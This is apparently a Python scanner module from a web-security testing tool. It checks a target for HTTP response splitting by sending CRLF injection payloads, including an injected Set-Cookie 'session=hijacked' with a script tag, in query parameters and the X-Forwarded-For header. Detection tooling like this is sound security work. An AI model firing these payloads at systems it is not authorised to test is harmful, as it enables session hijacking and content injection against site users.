#!/usr/bin/env python3
import requests
from typing import Dict, List, Optional
from urllib.parse import urljoin, parse_qs, urlparse
import json
from RAGScripts.utils.logger import setup_scanner_logger

async def check_response_splitting(target_url: str, path: str, method: str, initial_response: requests.Response) -> List[Dict]:
    findings = []
    
    try:
        test_url = urljoin(target_url, path)
        parsed_url = urlparse(test_url)
        query_params = parse_qs(parsed_url.query)
        
        # Test payloads for response splitting
        payloads = [
            {
                'payload': 'test\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<html>Injected</html>',
                'desc': 'Basic response splitting'
            },
            {
                'payload': 'test\nHTTP/1.1 200 OK\nContent-Type: text/html\n\n<html>Injected</html>',
                'desc': 'LF response splitting'
            },
            {
                'payload': 'test\r\nSet-Cookie: session=hijacked\r\n\r\n<script>alert(1)</script>',
                'desc': 'Cookie injection'
            },
            {
                'payload': 'test%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<html>Injected</html>',
                'desc': 'URL encoded splitting'
            }
        ]
        
        # Test query parameters
        for param_name, param_value in query_params.items():
            for test in payloads:
                modified_params = query_params.copy()
                modified_params[param_name] = [test['payload']]
                
                try:
                    response = requests.request(
                        method,
                        test_url,
                        params=modified_params,
                        headers={'Content-Type': 'application/json'},
                        timeout=5
                    )
                    
                    if is_response_splitting_vulnerable(response, test['payload']):
                        findings.append({
                            "type": "Response Splitting",
                            "detail": f"{test['desc']} in parameter {param_name}",
                            "evidence": {
                                "url": test_url,
                                "parameter": param_name,
                                "payload": test['payload'],
                                "status_code": response.status_code,
                                "response_headers": dict(response.headers),
                                "response": response.text[:200]
                            }
                        })
                except requests.exceptions.RequestException:
                    continue
        
        # Test headers
        for test in payloads:
            try:
                headers = {
                    'Content-Type': 'application/json',
                    'X-Forwarded-For': test['payload']
                }
                
                response = requests.request(
                    method,
                    test_url,
                    headers=headers,
                    timeout=5
                )
                
                if is_response_splitting_vulnerable(response, test['payload']):
                    findings.append({
                        "type": "Response Splitting",
                        "detail": f"{test['desc']} in header",
                        "evidence": {
                            "url": test_url,
                            "header": "X-Forwarded-For",
                            "payload": test['payload'],
                            "status_code": response.status_code,
                            "response_headers": dict(response.headers),
                            "response": response.text[:200]
                        }
                    })
            except requests.exceptions.RequestException:
                continue
                
    except Exception as e:
        print(f"Error in response splitting check: {str(e)}")
    
    return findings

def is_response_splitting_vulnerable(response: requests.Response, payload: str) -> bool:
    # Check for response splitting indicators
    
    # Look for injected headers in response
    response_headers_str = '\n'.join([f"{k}: {v}" for k, v in response.headers.items()]).lower()
    if 'set-cookie: session=hijacked' in response_headers_str:
        return True
    
    # Look for multiple Content-Type headers
    content_type_headers = [h for h in response.headers if h.lower() == 'content-type']
    if len(content_type_headers) > 1:
        return True
    
    # Check for HTML injection in non-HTML responses
    content_type = response.headers.get('content-type', '').lower()
    if 'html' not in content_type and '<html>' in response.text:
        return True
    
    # Check for response status line in body
    if 'HTTP/1.1' in response.text or 'HTTP/2' in response.text:
        return True
    
    return False

if __name__ == "__main__":
    # For standalone testing
    import asyncio
    async def test():
        result = await check_response_splitting(
            "http://localhost:5000",
            "/api/test?param=value",
            "GET",
            requests.Response()
        )
        print(json.dumps(result, indent=2))
    
    asyncio.run(test())